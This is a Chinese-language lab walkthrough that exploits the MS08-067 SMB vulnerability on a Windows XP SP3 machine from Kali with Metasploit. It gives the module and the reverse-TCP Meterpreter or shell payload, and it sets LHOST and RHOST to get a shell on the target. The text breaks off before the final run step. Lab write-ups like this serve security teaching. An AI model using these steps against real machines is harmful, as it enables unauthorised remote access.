MS08-067漏洞是微软在2008/10/22公布的一个漏洞。这个漏洞在那时会影响除Windows Server 2008 Core以外的所有Windows系统。

![](../Images/888eec553e80be304c41630c4ab8b3e6.png)

实验正文

实验器材：kali，win xp sp3英文版

实验目的：获取目标机shell以及进行一些操作

![](../Images/995e9c9d0d875a594af17bbb914f29f8.png)

实验记录

![](../Images/9fcab75b6a7d5c12deb50e4652fde0fa.png)![](../Images/f013eabcdaf17617b699522bedc34cdf.png)![](../Images/0ca16b89c7402d4e974595875b483fa7.png)![](../Images/878638a151a6bcc1e820c4b1932b0927.png)

1.kali在终端通过ifconfig获取本机IP（注意是if）  

winxp则通过ipconfig获取IP

![](../Images/f013eabcdaf17617b699522bedc34cdf.png)![](../Images/c6f0f09db318a5413077f7d142e48f93.png)

2.打开msfconsole（今天的标志超帅(≖ᴗ≖)✧）（ps：Msfconsole是一个一体化的集中控制台。很强大！）

![](../Images/3e97c65f4f719c397565c89ea7d7465b.png)

3.输入命令search ms08\_067,查找漏洞

![](../Images/b21a6ac6446277fa4b60a73e379d8845.png)

4.use exploit/windows/smb/ms08\_067\_netapi进入漏洞模块使用（就像是打开了潘多拉魔盒）

![](../Images/f013eabcdaf17617b699522bedc34cdf.png)![](../Images/cc24251ecb1f9376bddf378fd8620532.png)

5.set payload/windows/meterpreter/reverse\_tcp

或set payload generic/shell\_reverse\_tcp

设置攻击有效载荷（可以理解成选择武器）

（1）第一种是进入meterpreter，这是个很强大的工具，键入“?”即可查看功能，在此就不一一列举了（上图用的第一种）

（2）第二种会得到命令行的一个shell。

![](../Images/a729f8357e1b8529f39b20f755e9bc3b.png)

6.set LHOST “kali的IP”

   set RHOST “winxp的IP”

设置LHOST（kali的IP）和RHOST（win的IP）

![](../Images/f013eabcdaf17617b699522bedc34cdf.png)![](../Images/ebba93113629e826d33956e05346abbb.png)
